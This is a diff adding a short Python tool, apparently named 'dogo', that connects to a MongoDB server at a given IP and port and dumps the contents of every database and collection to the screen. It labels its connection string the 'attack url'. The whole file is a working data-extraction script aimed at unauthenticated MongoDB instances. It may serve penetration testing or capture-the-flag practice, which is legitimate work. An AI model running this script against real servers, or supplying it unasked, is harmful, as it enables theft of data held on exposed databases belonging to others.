@@ -1,0 +1,49 @@
+#!/usr/bin/python3
+
+import pymongo
+from termcolor import colored
+import sys
+import time
+
+if len(sys.argv) < 3:
+	print(colored("\n[!] ", 'red', attrs=['bold']) + "Insufficent arguments supplied......\n")
+	print("usage: ./dogo <target-ip> <target-port>\n")
+	sys.exit(0)
+
+IP = sys.argv[1]
+port = sys.argv[2]
+
+print(colored("\n[+] ", 'red', attrs=['bold']) + "Final attack url " + colored(f"[ mongodb://{IP}:{port}/ ]", 'red', attrs=['bold']) + " you have 10 seconds to abort CTRL+C\n")
+myclient = pymongo.MongoClient(f"mongodb://{IP}:{port}/")
+
+try:
+	time.sleep(10)
+except KeyboardInterrupt:
+	print(colored("\n[+] ", 'red', attrs=['bold']) + "Exiting program......\n")
+	sys.exit(0)
+
+print(colored("\n[+] ", 'red', attrs=['bold']) + "Fetching databases now.....\n")
+
+def ObjectId(id):
+	print(f"ObjectId(\'{id}\')")
+
+
+def db_dump(db_name):
+	print(colored("\n[+] ", 'green', attrs=['bold']) + "Dumping " +  colored(f"{db_name}", 'red', attrs=['bold']) + " now...\n")
+	database = myclient[f'{db_name}']
+	database_list = database.list_collection_names(include_system_collections=False)
+	#print(database_list)
+	
+	for item in database_list:
+		print(colored("\n[+] ", 'green', attrs=['bold']) + "Extracting collection " + colored(f"{item}", 'red', attrs=['bold']) + " now...\n")
+		mycol = database[f"{item}"]
+		for subitem in mycol.find():
+			print(subitem)
+	print(colored("=============================================================================================\n", 'blue', attrs=['bold']))
+
+
+for db in myclient.list_databases():
+	db_name_list = []
+	db_dict = db
+	print(colored("[+] ", 'green', attrs=['bold']) + str(db_dict.get('name', 'null')))
+	db_dump(str(db_dict.get('name', 'null')))
